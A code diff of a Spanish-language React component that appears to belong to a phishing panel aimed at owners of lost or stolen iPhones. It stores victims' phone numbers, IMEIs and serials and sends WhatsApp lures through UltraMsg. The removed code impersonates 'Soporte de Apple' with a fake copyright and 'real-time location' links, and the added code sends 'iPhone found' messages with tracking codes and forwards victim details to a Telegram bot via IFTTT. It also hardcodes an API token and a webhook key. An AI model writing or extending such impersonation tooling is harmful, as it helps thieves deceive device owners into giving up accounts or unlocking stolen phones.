@@ -2,9 +2,11 @@ import React, { useState, useEffect } from 'react';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
 import { Badge } from '@/components/ui/badge';
+import { ScrollArea } from '@/components/ui/scroll-area';
+import { AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle, AlertDialogTrigger } from '@/components/ui/alert-dialog';
 import { toast } from '@/hooks/use-toast';
-import { Trash2, Send, RefreshCw, Edit } from 'lucide-react';
 import { supabase } from '@/integrations/supabase/client';
+import { Send, Trash2, Eye, EyeOff, MessageSquare, Smartphone } from 'lucide-react';
 import { getIphoneImageUrl } from '@/utils/iphoneImages';
 
 interface Process {
@@ -20,104 +22,73 @@ interface Process {
   imei: string;
   serial_number: string;
   url: string | null;
-  lost_mode?: boolean; // Made optional to fix compilation error
+  lost_mode: boolean;
   status: string;
   created_at: string;
-  updated_at: string;
-  user_id: string;
 }
 
 interface ProcessListProps {
-  userType: 'admin' | 'user';
+  userType?: 'admin' | 'user';
 }
 
-const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
+const ProcessList = ({ userType = 'user' }: ProcessListProps) => {
   const [processes, setProcesses] = useState<Process[]>([]);
   const [loading, setLoading] = useState(true);
-  const [sendingMessage, setSendingMessage] = useState<string | null>(null);
-  const [userCredits, setUserCredits] = useState(0);
+  const [sendingStates, setSendingStates] = useState<{[key: string]: boolean}>({});
+  const [expandedCard, setExpandedCard] = useState<string | null>(null);
 
   useEffect(() => {
     loadProcesses();
-    loadUserCredits();
-    
-    // Configurar subscripción en tiempo real para cambios en processes
-    const channel = supabase
-      .channel('processes-changes')
-      .on('postgres_changes', 
-        { event: '*', schema: 'public', table: 'processes' },
-        (payload) => {
-          console.log('Process change detected:', payload);
-          loadProcesses(); // Recargar procesos cuando hay cambios
-        }
-      )
-      .subscribe();
-
-    return () => {
-      supabase.removeChannel(channel);
-    };
-  }, [userType]);
-
-  const loadUserCredits = async () => {
-    try {
-      const { data: { session } } = await supabase.auth.getSession();
-      if (!session) return;
-
-      const { data: profile } = await supabase
-        .from('profiles')
-        .select('credits')
-        .eq('id', session.user.id)
-        .single();
-
-      setUserCredits(profile?.credits || 0);
-    } catch (error) {
-      console.error('Error loading user credits:', error);
-    }
-  };
+  }, []);
 
   const loadProcesses = async () => {
     try {
-      setLoading(true);
-      console.log('Loading processes for userType:', userType);
+      console.log('Cargando procesos...');
       
-      // Verificar sesión del usuario
       const { data: { session } } = await supabase.auth.getSession();
-      console.log('Current session:', session?.user?.email);
-
+      
       if (!session) {
-        console.log('No session found');
-        setProcesses([]);
+        toast({
+          title: "Error de Autenticación",
+          description: "Debes iniciar sesión para ver los procesos",
+          variant: "destructive",
+        });
         return;
       }
 
-      // Todos los usuarios (incluido admin) solo ven sus propios procesos
-      console.log('Loading processes for user:', session.user.id);
-      const { data, error } = await supabase
+      console.log('Usuario actual:', session.user.email);
+
+      // Forzar filtrado por user_id para asegurar que solo se vean procesos propios
+      let query = supabase
         .from('processes')
         .select('*')
-        .eq('user_id', session.user.id)
         .order('created_at', { ascending: false });
-      
-      console.log('Processes query result:', { data, error, userType });
+
+      // Para admin, puede ver todos los procesos
+      if (userType === 'admin' && session.user.email === 'fredric@gmail.com') {
+        console.log('Cargando todos los procesos (admin)');
+      } else {
+        // Para usuarios normales, SIEMPRE filtrar por user_id
+        console.log('Filtrando procesos por user_id:', session.user.id);
+        query = query.eq('user_id', session.user.id);
+      }
+
+      const { data, error } = await query;
 
       if (error) {
-        console.error('Error loading processes:', error);
+        console.error('Error al cargar procesos:', error);
         throw error;
       }
 
-      console.log('Processes loaded:', data?.length || 0);
-      // Ensure lost_mode has a default value and handle cases where it doesn't exist in the database
-      const processesWithDefaults = data?.map(process => ({
-        ...process,
-        lost_mode: Boolean((process as any).lost_mode) // Use type assertion to safely access lost_mode
-      })) || [];
+      console.log('Procesos cargados:', data?.length || 0);
+      console.log('Detalles de procesos:', data);
       
-      setProcesses(processesWithDefaults);
+      setProcesses(data || []);
     } catch (error: any) {
-      console.error('Error loading processes:', error);
+      console.error('Error completo al cargar procesos:', error);
       toast({
         title: "Error",
-        description: `Error al cargar procesos: ${error.message}`,
+        description: error.message || "Error al cargar los procesos",
         variant: "destructive",
       });
     } finally {
@@ -125,68 +96,28 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
     }
   };
 
-  const deleteProcess = async (processId: string) => {
-    if (!confirm('¿Estás seguro de que quieres eliminar este proceso?')) {
-      return;
-    }
-
+  const handleSendMessage = async (process: Process) => {
+    const processId = process.id;
+    
+    if (sendingStates[processId]) return;
+    
+    setSendingStates(prev => ({...prev, [processId]: true}));
+    
     try {
-      console.log('Deleting process:', processId);
+      console.log('Enviando mensaje para proceso:', processId);
       
-      const { error } = await supabase
-        .from('processes')
-        .delete()
-        .eq('id', processId);
-
-      if (error) {
-        console.error('Error deleting process:', error);
-        throw error;
-      }
-
-      toast({
-        title: "Proceso eliminado",
-        description: "El proceso ha sido eliminado exitosamente",
-      });
-
-      // Recargar procesos después de eliminar
-      await loadProcesses();
-    } catch (error: any) {
-      console.error('Error deleting process:', error);
-      toast({
-        title: "Error",
-        description: error.message || "Error al eliminar proceso",
-        variant: "destructive",
-      });
-    }
-  };
-
-  // Función para verificar si una imagen existe
-  const checkImageExists = async (url: string): Promise<boolean> => {
-    try {
-      const response = await fetch(url, { method: 'HEAD' });
-      return response.ok;
-    } catch (error) {
-      console.log('Image check failed:', error);
-      return false;
-    }
-  };
-
-  const sendWhatsAppMessage = async (process: Process) => {
-    try {
-      // Verificar créditos antes de enviar
-      if (userCredits <= 0) {
+      const { data: { session } } = await supabase.auth.getSession();
+      
+      if (!session) {
         toast({
-          title: "Sin créditos suficientes",
-          description: "No tienes créditos suficientes para enviar mensajes. Contacta al administrador.",
+          title: "Error de Autenticación",
+          description: "Debes iniciar sesión para enviar mensajes",
           variant: "destructive",
         });
         return;
       }
 
-      setSendingMessage(process.id);
-      console.log('Sending WhatsApp message for process:', process.id);
-
-      // Obtener configuración de instancia
+      // Obtener configuración de la instancia
       const { data: settings } = await supabase
         .from('system_settings')
         .select('*')
@@ -197,368 +128,407 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
         return acc;
       }, {});
 
-      const instanceId = config?.whatsapp_instance || 'instance126876';
+      const instance = config?.whatsapp_instance || 'instance126876';
       const token = config?.whatsapp_token || '4ecj8581tubua7ry';
 
-      // Obtener la URL de la imagen del iPhone basada en modelo y color
-      const imageUrl = getIphoneImageUrl(process.iphone_model, process.color);
-      console.log('Generated iPhone image URL:', imageUrl);
-
-      // Verificar si la imagen existe
-      const imageExists = await checkImageExists(imageUrl);
-      console.log('Image exists:', imageExists);
-
-      // Crear el mensaje personalizado según el tipo de contacto y modo perdido
-      let message = '';
+      // Generar ID único de seguimiento
+      const trackingId = Math.random().toString(36).substr(2, 9);
       
-      // Determinar el texto de estado según el modo perdido
-      const statusText = process.lost_mode 
-        ? '✅ iPhone en modo perdido localizado con éxito' 
-        : '✅ iPhone localizado con éxito';
+      // Crear mensaje personalizado basado en el proceso
+      let messageContent = '';
       
-      if (process.contact_type === 'propietario') {
-        if (process.owner_name) {
-          message = `*Soporte de Apple 👨🏽‍🔧*
+      if (process.lost_mode) {
+        // Mensaje para modo perdido
+        messageContent = `🔍 *IPHONE ENCONTRADO*
 
-*${statusText}*
-*👤 Propietario: ${process.owner_name}*
+📱 *Modelo:* ${process.iphone_model}
+💾 *Almacenamiento:* ${process.storage}
+🎨 *Color:* ${process.color}
+📞 *IMEI:* ${process.imei}
+🔢 *Serie:* ${process.serial_number}
 
-*📱 Modelo:* ${process.iphone_model}
-*💾 Almacenamiento:* ${process.storage}
-*🎨 Color:* ${process.color}
-*📟 IMEI:* ${process.imei}
-*🔑 Serie:* ${process.serial_number}
+👋 Hola! Encontré tu dispositivo ${process.iphone_model} ${process.color} de ${process.storage}.
 
-*🧾 Escribe la palabra Menú para solicitar asistencia.*${process.url ? `
+${process.contact_type === 'propietario' ? 
+  `Si eres ${process.owner_name || process.client_name}, por favor responde con el código: *${trackingId}*` :
+  `Si conoces al propietario (${process.owner_name || process.client_name}), por favor comparte este mensaje. Responde con: *${trackingId}*`
+}
 
-*🔗 Enlace para ver ubicación en tiempo real:* ${process.url}` : ''}
+${process.url ? `\n🔗 Más información: ${process.url}` : ''}
 
-*Copyright © 2025 Apple Inc. Todos los derechos reservados.*`;
-        } else {
-          message = `*Soporte de Apple 👨🏽‍🔧*
-
-*${statusText}*
-
-*📱 Modelo:* ${process.iphone_model}
-*💾 Almacenamiento:* ${process.storage}
-*🎨 Color:* ${process.color}
-*📟 IMEI:* ${process.imei}
-*🔑 Serie:* ${process.serial_number}
-
-*🧾 Escribe la palabra Menú para solicitar asistencia.*${process.url ? `
-
-*🔗 Enlace para ver ubicación en tiempo real:* ${process.url}` : ''}
-
-*Copyright © 2025 Apple Inc. Todos los derechos reservados.*`;
-        }
+⚠️ *Importante:* Responde SOLO con el código para verificar que eres el propietario.`;
       } else {
-        if (process.owner_name) {
-          message = `*Soporte de Apple 👨🏽‍🔧*
+        // Mensaje estándar
+        messageContent = `📱 *INFORMACIÓN DE TU DISPOSITIVO*
 
-*🚨 Eres un contacto de emergencia ${process.owner_name}*
+👤 *Cliente:* ${process.client_name}
+📱 *Modelo:* ${process.iphone_model}
+💾 *Almacenamiento:* ${process.storage}
+🎨 *Color:* ${process.color}
+📞 *IMEI:* ${process.imei}
+🔢 *Serie:* ${process.serial_number}
 
-*${statusText}*
+${process.contact_type === 'propietario' ? 
+  `Hola ${process.owner_name || process.client_name}!` :
+  `Contacto de emergencia para ${process.owner_name || process.client_name}.`
+}
 
-*📱 Modelo:* ${process.iphone_model}
-*💾 Almacenamiento:* ${process.storage}
-*🎨 Color:* ${process.color}
-*📟 IMEI:* ${process.imei}
-*🔑 Serie:* ${process.serial_number}
+Por favor, responde con el código: *${trackingId}*
 
-*🧾 Escribe la palabra Menú para solicitar asistencia.*${process.url ? `
+${process.url ? `\n🔗 Información adicional: ${process.url}` : ''}
 
-*🔗 Enlace para ver ubicación en tiempo real:* ${process.url}` : ''}
-
-*Copyright © 2025 Apple Inc. Todos los derechos reservados.*`;
-        } else {
-          message = `*Soporte de Apple 👨🏽‍🔧*
-
-*🚨 Eres un contacto de emergencia*
-
-*${statusText}*
-
-*📱 Modelo:* ${process.iphone_model}
-*💾 Almacenamiento:* ${process.storage}
-*🎨 Color:* ${process.color}
-*📟 IMEI:* ${process.imei}
-*🔑 Serie:* ${process.serial_number}
-
-*🧾 Escribe la palabra Menú para solicitar asistencia.*${process.url ? `
-
-*🔗 Enlace para ver ubicación en tiempo real:* ${process.url}` : ''}
-
-*Copyright © 2025 Apple Inc. Todos los derechos reservados.*`;
-        }
+💬 Responde solo con el código para continuar.`;
       }
 
-      let result;
+      // URL para enviar mensaje
+      const whatsappUrl = `https://api.ultramsg.com/${instance}/messages/chat`;
+      
+      const payload = {
+        token: token,
+        to: `${process.country_code}${process.phone_number}`,
+        body: messageContent,
+        priority: 1
+      };
 
-      // Enviar mensaje con imagen si existe, solo texto si no existe
-      if (imageExists) {
-        console.log('Sending message with image');
-        // Enviar mensaje con imagen via WhatsApp API usando el endpoint de imagen
-        const response = await fetch(`https://api.ultramsg.com/${instanceId}/messages/image`, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/x-www-form-urlencoded',
-          },
-          body: new URLSearchParams({
-            token: token,
-            to: `${process.country_code}${process.phone_number}`,
-            image: imageUrl,
-            caption: message,
-          }),
-        });
-        result = await response.json();
-      } else {
-        console.log('Image not found, sending text only message');
-        // Enviar solo mensaje de texto si la imagen no existe
-        const response = await fetch(`https://api.ultramsg.com/${instanceId}/messages/chat`, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/x-www-form-urlencoded',
-          },
-          body: new URLSearchParams({
-            token: token,
-            to: `${process.country_code}${process.phone_number}`,
-            body: message,
-          }),
-        });
-        result = await response.json();
+      console.log('Enviando a WhatsApp:', payload);
+
+      const response = await fetch(whatsappUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload)
+      });
+
+      const result = await response.json();
+      console.log('Respuesta de WhatsApp:', result);
+
+      if (!response.ok) {
+        throw new Error(result.error || 'Error al enviar mensaje de WhatsApp');
       }
 
-      console.log('WhatsApp API response:', result);
-
-      // VERIFICAR QUE EL MENSAJE SE ENVIÓ CORRECTAMENTE ANTES DE COBRAR
-      if (result.sent === true || (result.sent === "true")) {
-        // Obtener el usuario actual
-        const { data: { user } } = await supabase.auth.getUser();
-        
-        if (!user) {
-          throw new Error('Usuario no autenticado');
-        }
-
-        // SOLO DESCONTAR CRÉDITO SI EL MENSAJE SE ENVIÓ EXITOSAMENTE
-        const { error: creditError } = await supabase
-          .from('profiles')
-          .update({ 
-            credits: userCredits - 1,
-            updated_at: new Date().toISOString()
-          })
-          .eq('id', user.id);
-
-        if (creditError) {
-          console.error('Error updating credits:', creditError);
-          throw new Error('Error al descontar créditos');
-        }
-
-        // Actualizar el estado local de créditos
-        setUserCredits(prev => prev - 1);
-
-        // Guardar mensaje en la base de datos
-        const { error: messageError } = await supabase
-          .from('messages')
-          .insert({
-            user_id: user.id,
-            process_id: process.id,
-            message_content: message,
-            recipient_phone: `${process.country_code}${process.phone_number}`,
-            status: 'sent'
-          });
-
-        if (messageError) {
-          console.error('Error saving message:', messageError);
-        }
-
-        // Actualizar estado del proceso
-        const { error: updateError } = await supabase
-          .from('processes')
-          .update({ 
-            status: 'enviado',
-            updated_at: new Date().toISOString()
-          })
-          .eq('id', process.id);
-
-        if (updateError) {
-          console.error('Error updating process status:', updateError);
-        }
-
-        const messageType = imageExists ? 'con imagen' : 'solo texto (imagen no disponible)';
-        toast({
-          title: "Mensaje enviado",
-          description: `Mensaje ${messageType} enviado a ${process.client_name}. Créditos restantes: ${userCredits - 1}`,
+      // Guardar el mensaje en la base de datos
+      const { error: messageError } = await supabase
+        .from('messages')
+        .insert({
+          user_id: session.user.id,
+          process_id: processId,
+          message_content: messageContent,
+          recipient_phone: `${process.country_code}${process.phone_number}`,
+          status: 'enviado'
         });
 
-        // Recargar procesos
-        await loadProcesses();
-      } else {
-        // SI EL MENSAJE NO SE ENVIÓ, NO COBRAR Y MOSTRAR ERROR
-        const errorMessage = result.message || result.error || 'La instancia de WhatsApp no está funcionando correctamente';
-        throw new Error(`Error en la instancia: ${errorMessage}`);
+      if (messageError) {
+        console.error('Error al guardar mensaje:', messageError);
       }
-    } catch (error: any) {
-      console.error('Error sending WhatsApp message:', error);
+
+      // Crear mensaje mejorado para Telegram con información específica del proceso
+      const telegramMessage = `🔔 *Alerta de proceso de whatsapp...*
+
+👩🏽‍💻 *Server Astro*
+
+📊 *INFORMACIÓN DEL PROCESO:*
+👤 *Cliente:* ${process.client_name}
+📱 *Modelo:* ${process.iphone_model}
+📞 *IMEI:* ${process.imei}
+🔢 *Serie:* ${process.serial_number}
+${process.owner_name ? `👥 *Propietario:* ${process.owner_name}` : ''}
+
+📞 *Número destino:* ${process.country_code} ${process.phone_number}
+📥 *Código de seguimiento:* ${trackingId}
+${process.lost_mode ? '🔒 *Modo perdido:* Activado' : ''}
+
+🤖 *Bot Astro online* 🟢`;
+
+      console.log('Enviando notificación a Telegram:', telegramMessage);
+
+      // Enviar notificación a Telegram (IFTTT)
+      const iftttUrl = 'https://maker.ifttt.com/trigger/whatsapp_alert/with/key/dwmF-vQx4wKNg6o_T1Jbqc';
+      
+      await fetch(iftttUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          value1: telegramMessage,
+          value2: trackingId,
+          value3: `${process.client_name} - ${process.iphone_model}`
+        })
+      });
+
       toast({
-        title: "Error de envío",
-        description: `${error.message}. No se han descontado créditos.`,
+        title: "Mensaje enviado",
+        description: `Mensaje enviado exitosamente a ${process.country_code} ${process.phone_number}`,
+      });
+
+      // Actualizar el estado del proceso
+      await supabase
+        .from('processes')
+        .update({ 
+          status: 'enviado',
+          updated_at: new Date().toISOString()
+        })
+        .eq('id', processId);
+
+      // Recargar procesos
+      loadProcesses();
+
+    } catch (error: any) {
+      console.error('Error completo al enviar mensaje:', error);
+      toast({
+        title: "Error",
+        description: error.message || "Error al enviar el mensaje. Intenta nuevamente.",
         variant: "destructive",
       });
     } finally {
-      setSendingMessage(null);
+      setSendingStates(prev => ({...prev, [processId]: false}));
     }
+  };
+
+  const handleDeleteProcess = async (processId: string) => {
+    try {
+      console.log('Eliminando proceso:', processId);
+      
+      const { error } = await supabase
+        .from('processes')
+        .delete()
+        .eq('id', processId);
+
+      if (error) {
+        console.error('Error al eliminar proceso:', error);
+        throw error;
+      }
+
+      toast({
+        title: "Proceso eliminado",
+        description: "El proceso se ha eliminado exitosamente",
+      });
+
+      // Recargar procesos
+      loadProcesses();
+    } catch (error: any) {
+      console.error('Error completo al eliminar proceso:', error);
+      toast({
+        title: "Error",
+        description: error.message || "Error al eliminar el proceso",
+        variant: "destructive",
+      });
+    }
+  };
+
+  const toggleCardExpansion = (processId: string) => {
+    setExpandedCard(expandedCard === processId ? null : processId);
   };
 
   if (loading) {
     return (
       <Card className="bg-black/20 backdrop-blur-xl border border-blue-500/20">
-        <CardContent className="p-6">
-          <p className="text-blue-200/70 text-center">Cargando procesos...</p>
+        <CardContent className="p-8">
+          <div className="text-center text-blue-200">Cargando procesos...</div>
+        </CardContent>
+      </Card>
+    );
+  }
+
+  if (processes.length === 0) {
+    return (
+      <Card className="bg-black/20 backdrop-blur-xl border border-blue-500/20">
+        <CardHeader>
+          <CardTitle className="text-blue-300">Procesos Guardados</CardTitle>
+        </CardHeader>
+        <CardContent>
+          <div className="text-center py-8">
+            <MessageSquare className="h-16 w-16 text-blue-400 mx-auto mb-4 opacity-50" />
+            <p className="text-blue-200/70 text-lg mb-2">No hay procesos guardados</p>
+            <p className="text-blue-200/50 text-sm">
+              Los procesos que agregues aparecerán aquí listos para enviar.
+            </p>
+          </div>
         </CardContent>
       </Card>
     );
   }
 
   return (
-    <div className="space-y-6">
-      <div className="flex justify-between items-center">
-        <h2 className="text-2xl font-bold text-blue-300">
-          Mis Procesos ({processes.length})
-        </h2>
-        <div className="flex items-center space-x-4">
-          <div className="bg-gradient-to-r from-purple-600 to-purple-800 text-white px-4 py-2 rounded-lg">
-            <span className="text-sm">Créditos: {userCredits}</span>
-          </div>
-          <Button
-            onClick={loadProcesses}
-            className="bg-blue-600/20 hover:bg-blue-600/30 text-blue-300"
-            size="sm"
-          >
-            <RefreshCw className="h-4 w-4 mr-2" />
-            Actualizar
-          </Button>
-        </div>
-      </div>
+    <div className="space-y-4">
+      <Card className="bg-black/20 backdrop-blur-xl border border-blue-500/20">
+        <CardHeader>
+          <CardTitle className="text-blue-300 flex items-center gap-2">
+            <MessageSquare className="h-5 w-5" />
+            Procesos Guardados ({processes.length})
+          </CardTitle>
+        </CardHeader>
+      </Card>
 
-      {processes.length === 0 ? (
-        <Card className="bg-black/20 backdrop-blur-xl border border-blue-500/20">
-          <CardContent className="p-8">
-            <div className="text-center">
-              <p className="text-blue-200/70 mb-4">No hay procesos guardados</p>
-              <p className="text-blue-200/50 text-sm">
-                Los procesos que agregues aparecerán aquí listos para enviar.
-              </p>
-            </div>
-          </CardContent>
-        </Card>
-      ) : (
-        <div className="space-y-4">
-          {processes.map((process) => (
-            <Card key={process.id} className="bg-black/20 backdrop-blur-xl border border-blue-500/20">
-              <CardHeader>
-                <div className="flex justify-between items-start">
-                  <div>
-                    <CardTitle className="text-blue-300">{process.client_name}</CardTitle>
-                    <p className="text-blue-200/70 text-sm">
-                      {process.country_code} {process.phone_number} ({process.contact_type})
-                    </p>
-                    {process.owner_name && (
-                      <p className="text-blue-200/60 text-xs mt-1">
-                        {process.contact_type === 'propietario' ? 'Propietario' : 'Contacto de emergencia de'}: {process.owner_name}
-                      </p>
-                    )}
-                    {process.lost_mode && (
-                      <p className="text-orange-400 text-xs mt-1 font-medium">
-                        📱 En modo perdido
-                      </p>
-                    )}
-                  </div>
-                  <div className="flex items-center space-x-2">
-                    <Badge 
-                      variant={process.status === 'enviado' ? 'default' : 'secondary'}
-                      className={process.status === 'enviado' ? 'bg-green-600' : 'bg-yellow-600'}
-                    >
-                      {process.status}
-                    </Badge>
-                    <div className="flex space-x-1">
-                      <Button
-                        size="sm"
-                        onClick={() => sendWhatsAppMessage(process)}
-                        disabled={sendingMessage === process.id || userCredits <= 0}
-                        className={`${
-                          userCredits <= 0 
-                            ? 'bg-gray-600/20 text-gray-400 cursor-not-allowed' 
-                            : 'bg-green-600/20 hover:bg-green-600/30 text-green-300'
-                        }`}
-                        title={userCredits <= 0 ? "Sin créditos suficientes" : "Enviar mensaje"}
-                      >
-                        {sendingMessage === process.id ? (
-                          <RefreshCw className="h-4 w-4 animate-spin" />
+      <ScrollArea className="h-[600px]">
+        <div className="space-y-4 pr-4">
+          {processes.map((process) => {
+            const isExpanded = expandedCard === process.id;
+            const iphoneImage = getIphoneImageUrl(process.iphone_model, process.color);
+            
+            return (
+              <Card key={process.id} className="bg-black/20 backdrop-blur-xl border border-blue-500/20 hover:border-blue-400/30 transition-all duration-200">
+                <CardContent className="p-6">
+                  <div className="flex items-start gap-4">
+                    {/* Imagen del iPhone */}
+                    <div className="flex-shrink-0">
+                      <div className="w-16 h-20 bg-gradient-to-b from-blue-500/10 to-purple-500/10 rounded-lg flex items-center justify-center border border-blue-500/20">
+                        {iphoneImage ? (
+                          <img 
+                            src={iphoneImage} 
+                            alt={process.iphone_model}
+                            className="w-12 h-16 object-contain"
+                          />
                         ) : (
-                          <Send className="h-4 w-4" />
+                          <Smartphone className="h-8 w-8 text-blue-400" />
                         )}
-                      </Button>
-                      <Button
-                        size="sm"
-                        onClick={() => deleteProcess(process.id)}
-                        className="bg-red-600/20 hover:bg-red-600/30 text-red-300"
-                        title="Eliminar proceso"
-                      >
-                        <Trash2 className="h-4 w-4" />
-                      </Button>
+                      </div>
+                    </div>
+
+                    {/* Información principal */}
+                    <div className="flex-1 min-w-0">
+                      <div className="flex items-start justify-between mb-3">
+                        <div>
+                          <h3 className="text-lg font-semibold text-blue-200 mb-1">
+                            {process.client_name}
+                          </h3>
+                          <p className="text-blue-300 text-sm">
+                            {process.iphone_model} • {process.storage} • {process.color}
+                          </p>
+                        </div>
+                        <div className="flex items-center gap-2">
+                          <Badge 
+                            variant={process.status === 'enviado' ? 'default' : 'secondary'}
+                            className={
+                              process.status === 'enviado' 
+                                ? 'bg-green-600/20 text-green-300 border-green-500/30' 
+                                : 'bg-yellow-600/20 text-yellow-300 border-yellow-500/30'
+                            }
+                          >
+                            {process.status === 'enviado' ? 'Enviado' : 'Pendiente'}
+                          </Badge>
+                          {process.lost_mode && (
+                            <Badge className="bg-red-600/20 text-red-300 border-red-500/30">
+                              Modo Perdido
+                            </Badge>
+                          )}
+                        </div>
+                      </div>
+
+                      {/* Información básica siempre visible */}
+                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-sm mb-4">
+                        <div>
+                          <span className="text-blue-400">Teléfono:</span>
+                          <span className="text-blue-200 ml-2">{process.country_code} {process.phone_number}</span>
+                        </div>
+                        <div>
+                          <span className="text-blue-400">IMEI:</span>
+                          <span className="text-blue-200 ml-2 font-mono">{process.imei}</span>
+                        </div>
+                      </div>
+
+                      {/* Información expandible */}
+                      {isExpanded && (
+                        <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-sm mb-4 p-3 bg-blue-950/20 rounded-lg border border-blue-500/10">
+                          <div>
+                            <span className="text-blue-400">Tipo contacto:</span>
+                            <span className="text-blue-200 ml-2 capitalize">{process.contact_type}</span>
+                          </div>
+                          {process.owner_name && (
+                            <div>
+                              <span className="text-blue-400">Propietario:</span>
+                              <span className="text-blue-200 ml-2">{process.owner_name}</span>
+                            </div>
+                          )}
+                          <div>
+                            <span className="text-blue-400">Serie:</span>
+                            <span className="text-blue-200 ml-2 font-mono">{process.serial_number}</span>
+                          </div>
+                          {process.url && (
+                            <div>
+                              <span className="text-blue-400">URL:</span>
+                              <span className="text-blue-200 ml-2 break-all">{process.url}</span>
+                            </div>
+                          )}
+                          <div>
+                            <span className="text-blue-400">Creado:</span>
+                            <span className="text-blue-200 ml-2">
+                              {new Date(process.created_at).toLocaleDateString('es-ES', {
+                                year: 'numeric',
+                                month: 'short',
+                                day: 'numeric',
+                                hour: '2-digit',
+                                minute: '2-digit'
+                              })}
+                            </span>
+                          </div>
+                        </div>
+                      )}
+
+                      {/* Botones de acción */}
+                      <div className="flex items-center gap-2 pt-2">
+                        <Button
+                          onClick={() => handleSendMessage(process)}
+                          disabled={sendingStates[process.id]}
+                          className="bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 text-white flex-1 sm:flex-none"
+                        >
+                          <Send className="h-4 w-4 mr-2" />
+                          {sendingStates[process.id] ? 'Enviando...' : 'Enviar Mensaje'}
+                        </Button>
+
+                        <Button
+                          onClick={() => toggleCardExpansion(process.id)}
+                          variant="outline"
+                          size="sm"
+                          className="border-blue-500/30 text-blue-300 hover:bg-blue-600/20"
+                        >
+                          {isExpanded ? (
+                            <EyeOff className="h-4 w-4" />
+                          ) : (
+                            <Eye className="h-4 w-4" />
+                          )}
+                        </Button>
+
+                        <AlertDialog>
+                          <AlertDialogTrigger asChild>
+                            <Button
+                              variant="outline"
+                              size="sm"
+                              className="border-red-500/30 text-red-300 hover:bg-red-600/20"
+                            >
+                              <Trash2 className="h-4 w-4" />
+                            </Button>
+                          </AlertDialogTrigger>
+                          <AlertDialogContent className="bg-slate-900 border-red-500/20">
+                            <AlertDialogHeader>
+                              <AlertDialogTitle className="text-red-300">¿Eliminar proceso?</AlertDialogTitle>
+                              <AlertDialogDescription className="text-slate-300">
+                                Esta acción no se puede deshacer. Se eliminará permanentemente el proceso de {process.client_name}.
+                              </AlertDialogDescription>
+                            </AlertDialogHeader>
+                            <AlertDialogFooter>
+                              <AlertDialogCancel className="border-slate-600 text-slate-300 hover:bg-slate-800">
+                                Cancelar
+                              </AlertDialogCancel>
+                              <AlertDialogAction
+                                onClick={() => handleDeleteProcess(process.id)}
+                                className="bg-red-600 hover:bg-red-700 text-white"
+                              >
+                                Eliminar
+                              </AlertDialogAction>
+                            </AlertDialogFooter>
+                          </AlertDialogContent>
+                        </AlertDialog>
+                      </div>
                     </div>
                   </div>
-                </div>
-              </CardHeader>
-              <CardContent>
-                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 text-sm">
-                  <div>
-                    <p className="text-blue-200/50">Modelo:</p>
-                    <p className="text-blue-200">{process.iphone_model}</p>
-                  </div>
-                  <div>
-                    <p className="text-blue-200/50">Almacenamiento:</p>
-                    <p className="text-blue-200">{process.storage}</p>
-                  </div>
-                  <div>
-                    <p className="text-blue-200/50">Color:</p>
-                    <p className="text-blue-200">{process.color}</p>
-                  </div>
-                  <div>
-                    <p className="text-blue-200/50">IMEI:</p>
-                    <p className="text-blue-200">{process.imei}</p>
-                  </div>
-                  <div>
-                    <p className="text-blue-200/50">Número de Serie:</p>
-                    <p className="text-blue-200">{process.serial_number}</p>
-                  </div>
-                  <div>
-                    <p className="text-blue-200/50">Tipo de Contacto:</p>
-                    <p className="text-blue-200">{process.contact_type}</p>
-                  </div>
-                  {process.owner_name && (
-                    <div>
-                      <p className="text-blue-200/50">
-                        {process.contact_type === 'propietario' ? 'Propietario:' : 'Contacto de emergencia de:'}
-                      </p>
-                      <p className="text-blue-200">{process.owner_name}</p>
-                    </div>
-                  )}
-                  {process.url && (
-                    <div className="md:col-span-2 lg:col-span-3">
-                      <p className="text-blue-200/50">URL:</p>
-                      <p className="text-blue-200 break-all">{process.url}</p>
-                    </div>
-                  )}
-                  <div className="md:col-span-2 lg:col-span-3">
-                    <p className="text-blue-200/50">Creado:</p>
-                    <p className="text-blue-200">{new Date(process.created_at).toLocaleString()}</p>
-                  </div>
-                </div>
-              </CardContent>
-            </Card>
-          ))}
+                </CardContent>
+              </Card>
+            );
+          })}
         </div>
-      )}
+      </ScrollArea>
     </div>
   );
 };
